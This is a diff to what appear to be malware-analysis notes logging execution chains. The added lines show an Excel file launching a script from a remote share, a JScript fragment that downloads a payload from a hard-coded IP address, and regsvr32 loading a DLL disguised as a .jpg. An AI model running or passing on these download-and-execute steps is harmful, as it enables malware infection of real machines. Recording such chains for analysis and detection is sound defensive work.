@@ -8,6 +8,8 @@
 
 *************************************************
 
+Exec #1
+
 zip > .jar > .dll
 
 java -jar C:\Users\Admin\AppData\Local\Temp\DOLORUMR.jar
@@ -22,7 +24,16 @@ ctfmon.exe -p 1234
 
 *************************************************
 
+#Exec 2.
 
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\VOLUPTATEKH.xlsx
+
+WScript.exe \\85.195.115.20\share\1.js
+
+var S5 = new ActiveXObject("msxml2.xmlhttp"), hp = new ActiveXObject("adodb.stream");
+S5.open("GET", "http://77.245.76.113/1s6iL/BtCxD", false);
+
+regsvr32 SH.jpg
 
 *************************************************
 
